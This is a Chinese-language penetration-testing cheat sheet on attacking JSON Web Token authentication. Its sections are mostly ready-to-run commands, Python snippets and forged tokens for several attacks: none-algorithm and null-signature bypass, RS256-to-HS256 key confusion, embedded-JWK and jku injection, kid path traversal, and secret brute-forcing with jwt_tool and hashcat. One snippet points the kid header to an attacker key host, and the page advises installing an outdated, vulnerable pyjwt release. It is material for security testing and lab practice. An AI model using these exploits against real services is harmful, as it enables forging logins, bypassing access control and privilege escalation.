[原文文档](README.en.md)

# JWT - JSON Web Token

> JSON Web Token (JWT) 是一种开放标准（RFC 7519），定义了一种紧凑且自包含的方式，用于在各方之间以JSON对象的形式安全传输信息。由于信息是数字签名的，因此可以进行验证和信任。

## 目录

- [工具](#工具)
- [JWT格式](#jwt格式)
    - [头部](#头部)
    - [载荷](#载荷)
- [JWT签名](#jwt签名)
    - [JWT签名 - 空签名攻击 (CVE-2020-28042)](#jwt签名---空签名攻击-cve-2020-28042)
    - [JWT签名 - 正确签名的泄露 (CVE-2019-7644)](#jwt签名---正确签名的泄露-cve-2019-7644)
    - [JWT签名 - None算法 (CVE-2015-9235)](#jwt签名---none算法-cve-2015-9235)
    - [JWT签名 - 密钥混淆攻击 RS256转HS256 (CVE-2016-5431)](#jwt签名---密钥混淆攻击-rs256转hs256-cve-2016-5431)
    - [JWT签名 - 密钥注入攻击 (CVE-2018-0114)](#jwt签名---密钥注入攻击-cve-2018-0114)
    - [JWT签名 - 从已签名JWT中恢复公钥](#jwt签名---从已签名jwt中恢复公钥)
- [JWT密钥](#jwt密钥)
    - [使用密钥编码和解码JWT](#使用密钥编码和解码jwt)
    - [破解JWT密钥](#破解jwt密钥)
- [JWT声明](#jwt声明)
    - [JWT kid声明滥用](#jwt-kid声明滥用)
    - [JWKS - jku头部注入](#jwks---jku头部注入)
- [实验](#实验)
- [参考资料](#参考资料)

## 工具

- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  🐍 用于测试、调整和破解JSON Web Token的工具包
- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - 用C编写的JWT暴力破解器
- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript对象签名和加密渗透测试助手
- [jwt.io](https://jwt.io/) - 编码器/解码器

## JWT格式

JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`

示例 : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

我们可以将其分为3个由点分隔的组件。

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # 头部
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # 载荷
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # 签名
```

### 头部

在[JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515)中定义的注册头部参数名称。
最基本的JWT头部是以下JSON。

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

其他参数在RFC中注册。

| 参数 | 定义 | 描述 |
|-----------|--------------------------------------|-------------|
| alg | 算法 | 识别用于保护JWS的加密算法 |
| jku | JWK集URL | 指向一组JSON编码的公钥资源 |
| jwk | JSON Web密钥 | 用于数字签名JWS的公钥 |
| kid | 密钥ID | 用于保护JWS的密钥 |
| x5u | X.509 URL | X.509公钥证书或证书链的URL |
| x5c | X.509证书链 | 用于数字签名JWS的PEM编码的X.509公钥证书或证书链 |
| x5t | X.509证书SHA-1指纹) | X.509证书DER编码的Base64 url编码SHA-1指纹(摘要) |
| x5t#S256 | X.509证书SHA-256指纹 | X.509证书DER编码的Base64 url编码SHA-256指纹(摘要) |
| typ | 类型 | 媒体类型。通常为`JWT` |
| cty | 内容类型 | 不建议使用此头部参数 |
| crit | 关键 | 正在使用扩展和/或JWA |

默认算法是"HS256"（HMAC SHA256对称加密）。
"RS256"用于非对称目的（RSA非对称加密和私钥签名）。

| `alg` 参数值 | 数字签名或MAC算法 | 要求 |
|-------|------------------------------------------------|---------------|
| HS256 | 使用SHA-256的HMAC | 必需 |
| HS384 | 使用SHA-384的HMAC | 可选 |
| HS512 | 使用SHA-512的HMAC | 可选 |
| RS256 | 使用SHA-256的RSASSA-PKCS1-v1_5 | 推荐 |
| RS384 | 使用SHA-384的RSASSA-PKCS1-v1_5 | 可选 |
| RS512 | 使用SHA-512的RSASSA-PKCS1-v1_5 | 可选 |
| ES256 | 使用P-256和SHA-256的ECDSA | 推荐 |
| ES384 | 使用P-384和SHA-384的ECDSA | 可选 |
| ES512 | 使用P-521和SHA-512的ECDSA | 可选 |
| PS256 | 使用SHA-256和MGF1与SHA-256的RSASSA-PSS | 可选 |
| PS384 | 使用SHA-384和MGF1与SHA-384的RSASSA-PSS | 可选 |
| PS512 | 使用SHA-512和MGF1与SHA-512的RSASSA-PSS | 可选 |
| none | 未执行数字签名或MAC | 必需 |

使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入头部：`python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`

### 载荷

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

声明是预定义的键及其值：

- iss: 令牌的发行者
- exp: 过期时间戳（拒绝已过期的令牌）。注意：按照规范定义，这必须以秒为单位。
- iat: JWT发出的时间。可用于确定JWT的年龄
- nbf: "不早于"是令牌将变为活动的未来时间。
- jti: JWT的唯一标识符。用于防止JWT被重复使用或重放。
- sub: 令牌的主题（很少使用）
- aud: 令牌的受众（也很少使用）

使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入载荷声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

## JWT签名

### JWT签名 - 空签名攻击 (CVE-2020-28042)

发送一个没有签名的HS256算法的JWT，如`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**利用**:

```ps1
python3 jwt_tool.py JWT_HERE -X n
```

**解构**:

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### JWT签名 - 正确签名的泄露 (CVE-2019-7644)

发送一个具有错误签名的JWT，端点可能会响应错误并泄露正确的签名。

- [jwt-dotnet/jwt: 关键安全修复：您在每次SignatureVerificationException中泄露正确签名... #61](https://github.com/jwt-dotnet/jwt/issues/61)
- [CVE-2019-7644: Auth0-WCF-Service-JWT中的安全漏洞](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```ps1
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### JWT签名 - None算法 (CVE-2015-9235)

JWT支持用于签名的`None`算法。这可能是为了调试应用程序而引入的。然而，这可能对应用程序的安全性产生严重影响。

None算法变体：

- `none`
- `None`
- `NONE`
- `nOnE`

要利用此漏洞，您只需解码JWT并更改用于签名的算法。然后您可以提交新的JWT。但是，除非您**移除**签名，否则这将不起作用

或者您可以修改现有的JWT（注意过期时间）

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [JWT_HERE] -X a
    ```

- 手动编辑JWT

    ```python
    import jwt

    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
    decodedToken = jwt.decode(jwtToken, verify=False)       

    # 在使用类型'None'进行编码之前解码令牌
    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

    print(noneEncoded.decode())
    ```

### JWT签名 - 密钥混淆攻击 RS256转HS256 (CVE-2016-5431)

如果服务器代码期望接收"alg"设置为RSA的令牌，但接收了"alg"设置为HMAC的令牌，则在验证签名时可能会错误地将公钥用作HMAC对称密钥。

由于公钥有时可以被攻击者获取，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。当应用程序使用与其TLS Web服务器相同的RSA密钥对时：`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> **HS256**算法使用密钥来签名和验证每条消息。
> **RS256**算法使用私钥签名消息，并使用公钥进行身份验证。

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: 此行为已在python库中修复，并将返回此错误`jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`。您需要安装以下版本：`pip install pyjwt==0.4.3`。

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
    ```

- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 查找公钥，通常在`/jwks.json`或`/.well-known/jwks.json`中
    2. 在JWT编辑器的Keys标签页中加载，点击`New RSA Key`。
    3. . 在对话框中粘贴您之前获得的JWK：`{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
    4. 选择PEM单选按钮并复制生成的PEM密钥。
    5. 转到Decoder标签页并Base64编码PEM。
    6. 返回JWT编辑器的Keys标签页并生成JWK格式的`New Symmetric Key`。
    7. 将k参数的生成值替换为您刚才复制的Base64编码的PEM密钥。
    8. 编辑JWT令牌的alg为`HS256`和数据。
    9. 点击`Sign`并保留选项：`Don't modify header`

- 手动使用以下步骤将RS256 JWT令牌编辑为HS256
    1. 使用此命令将我们的公钥(key.pem)转换为HEX。

        ```powershell
        $ cat key.pem | xxd -p | tr -d "\\n"
        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
        ```

    2. 通过提供我们的公钥作为ASCII十六进制和我们之前编辑的令牌来生成HMAC签名。

        ```powershell
        $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
        ```

    3. 转换签名(十六进制到"base64 URL")

        ```powershell
        python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
        ```

    4. 将签名添加到编辑后的载荷

        ```powershell
        [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
        ```

### JWT签名 - 密钥注入攻击 (CVE-2018-0114)

> Cisco node-jose开源库0.11.0版本之前的漏洞可能允许未经身份验证的远程攻击者使用嵌入在令牌中的密钥重新签署令牌。该漏洞是由于node-jose遵循JSON Web令牌(JWTs)的JSON Web签名(JWS)标准。该标准规定，表示公钥的JSON Web密钥(JWK)可以嵌入JWS的头部。该公钥随后被信任用于验证。攻击者可以通过删除原始签名，在头部添加新公钥，然后使用与嵌入在该JWS头部中的公钥相关的(攻击者拥有的)私钥签署对象来利用此漏洞伪造有效的JWS对象。

**利用**:

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [JWT_HERE] -X i
    ```

- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 添加`New RSA key`
    2. 在JWT的Repeater标签页中，编辑数据
    3. `Attack` > `Embedded JWK`

**解构**:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[使用新的私钥签名；公钥注入]
```

### JWT签名 - 从已签名JWT中恢复公钥

RS256、RS384和RS512算法使用带有PKCS#1 v1.5填充的RSA作为其签名方案。这具有这样的特性：您可以给定两条不同的消息和相应的签名来计算公钥。

[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): 从两个已签名的JWT计算RSA公钥

```ps1
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
计算公钥。这可能需要一分钟...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```

## JWT密钥

> 要创建JWT，使用密钥对头部和载荷进行签名，从而生成签名。密钥必须保密并安全保存，以防止未经授权访问JWT或篡改其内容。如果攻击者能够访问密钥，他们可以创建、修改或签署自己的令牌，绕过预期的安全控制。

### 使用密钥编码和解码JWT

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool):

    ```ps1
    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
    
    Token header values:
    [+] alg = "HS256"
    [+] typ = "JWT"

    Token payload values:
    [+] name = "John Doe"
    ```

- 使用[pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`

    ```python
    import jwt
    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
    jwt.decode(encoded, 'secret', algorithms=['HS256']) 
    ```

### 破解JWT密钥

3502个公开可用JWT的有用列表：[wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)，包括`your_jwt_secret`，`change_this_super_secret_random_string`等。

#### JWT工具

首先，使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)暴力破解用于计算签名的"secret"密钥

```powershell
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```

然后编辑JSON Web Token内部的字段。

```powershell
Current value of role is: user
Please enter new value and hit ENTER
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] Continue to next step

Please select a field number (or 0 to Continue):
> 0
```

最后，使用之前检索到的"secret"密钥对令牌进行签名以完成令牌。

```powershell
Token Signing:
[1] Sign token with known key
[2] Strip signature from token vulnerable to CVE-2015-2951
[3] Sign with Public Key bypass vulnerability
[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> secret

Please enter the key length:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

- 侦察: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
- 扫描: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
- 利用: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
- 模糊测试: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
- 审查: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`

#### Hashcat

> 支持使用hashcat破解JWT（JSON Web Token），在单个GTX1080上速度达到365MH/s - [来源](https://twitter.com/hashcat/status/955154646494040065)

- 字典攻击: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
- 基于规则的攻击: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
- 暴力破解攻击: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`

## JWT声明

[IANA的JSON Web Token声明](https://www.iana.org/assignments/jwt/jwt.xhtml)

### JWT kid声明滥用

JSON Web Token (JWT) 中的"kid"（密钥ID）声明是一个可选的头部参数，用于指示用于签名或加密JWT的加密密钥的标识符。重要的是要注意，密钥标识符本身不提供任何安全好处，而是使接收方能够定位验证JWT完整性的所需密钥。

- 示例 #1 : 本地文件

    ```json
    {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/root/res/keys/secret.key"
    }
    ```

- 示例 #2 : 远程文件

    ```json
    {
        "alg":"RS256",
        "typ":"JWT",
        "kid":"http://localhost:7070/privKey.key"
    }
    ```

kid头部中指定的文件内容将用于生成签名。

```js
// HS256示例
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret-from-secret.key
)
```

滥用kid头部的常见方式：

- 获取密钥内容以更改载荷
- 更改密钥路径以强制使用自己的密钥

    ```py
    >>> jwt.encode(
    ...     {"some": "payload"},
    ...     "secret",
    ...     algorithm="HS256",
    ...     headers={"kid": "http://evil.example.com/custom.key"},
    ... )
    ```

- 更改密钥路径为具有可预测内容的文件。

  ```ps1
  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
  ```

- 修改kid头部以尝试SQL和命令注入

### JWKS - jku头部注入

"jku"头部值指向JWKS文件的URL。通过将"jku"URL替换为包含公钥的攻击者控制的URL，攻击者可以使用配对的私钥对令牌进行签名，然后让服务检索恶意公钥并验证令牌。

它有时通过标准端点公开暴露：

- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/api/v1/keys`
- [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

您应该为此攻击创建自己的密钥对并托管它。它应该看起来像这样：

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

**利用**:

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X s
    python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
    ```

- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 生成新RSA密钥并托管
    2. 编辑JWT的数据
    3. 将`kid`头部替换为您JWKS中的那个
    4. 添加`jku`头部并签署JWT（应选中"Don't modify header"选项）

**解构**:

```json
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[使用新私钥签名；导出公钥]
```

## 实验

- [PortSwigger - 通过未验证签名绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
- [PortSwigger - 通过有缺陷的签名验证绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
- [PortSwigger - 通过弱签名密钥绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
- [PortSwigger - 通过jwk头部注入绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
- [PortSwigger - 通过jku头部注入绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
- [PortSwigger - 通过kid头部路径遍历绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
- [Root Me - JWT - 简介](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
- [Root Me - JWT - 已撤销令牌](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
- [Root Me - JWT - 弱密钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
- [Root Me - JWT - 不安全的文件签名](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
- [Root Me - JWT - 公钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
- [Root Me - JWT - 头部注入](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
- [Root Me - JWT - 不安全的密钥处理](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

## 参考资料

- [理解JSON Web Token的5个简单步骤 - Shaurya Sharma - 2019年12月21日](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
- [攻击JWT认证 - Sjoerd Langkemper - 2016年9月28日](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [Club EH RM 05 - JSON Web Token利用简介 - Nishacid - 2023年2月23日](https://www.youtube.com/watch?v=d7wmUz57Nlg)
- [JSON Web Token库中的严重漏洞 - Tim McLean - 2015年3月31日](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
- [Hacking JSON Web Token (JWT) - pwnzzzz - 2018年5月3日](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- [Hacking JSON Web Tokens - 从零到英雄轻松搞定 - Websecurify - 2017年2月9日](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [Hacking JSON Web Tokens - Vickie Li - 2019年10月27日](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - 2017年8月27日](https://nandynarwhals.org/hitbgsec2017-pasty/)
- [如何通过时序攻击破解弱JWT实现 - Tamas Polgar - 2017年1月7日](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
- [Auth0认证API中的JWT验证绕过 - Ben Knight - 2020年4月16日](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
- [JSON Web Token漏洞 - 0xn3va - 2022年3月27日](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
- [JWT攻击101 - TrustFoundry - Tyler Rosonke - 2017年12月8日](https://trustfoundry.net/jwt-hacking-101/)
- [了解如何将JSON Web Token (JWT)用于身份验证 - @dwylhq - 2022年5月3日](https://github.com/dwyl/learn-json-web-tokens)
- [权限提升像老板一样 - janijay007 - 2018年10月27日](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- [简单JWT攻击 - Hari Prasanth (@b1ack_h00d) - 2019年3月7日](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
- [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - 2016年8月7日](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- [Write up – JRR Token – LeHack 2019 - Laphaze - 2019年7月7日](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)